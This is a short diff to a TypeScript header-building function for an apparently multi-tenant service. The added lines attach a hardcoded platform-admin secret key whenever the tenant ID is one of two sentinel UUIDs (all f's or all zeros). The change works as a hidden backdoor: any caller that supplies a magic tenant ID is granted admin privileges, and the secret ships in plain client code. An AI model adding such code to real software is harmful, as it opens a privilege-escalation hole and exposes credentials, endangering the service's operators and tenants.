@@ -27,6 +27,9 @@ export const getHeaders = (auth?: any) => {
 
   if (tenantId) {
     headers['X-Nextflow-Tenant-ID'] = tenantId;
+    if (tenantId === 'ffffffff-ffff-ffff-ffff-ffffffffffff' || tenantId === '00000000-0000-0000-0000-000000000000') {
+      headers['x-platform-admin-key'] = 'nf_platform_secret_admin_key_2026';
+    }
   }
 
   if (token) {
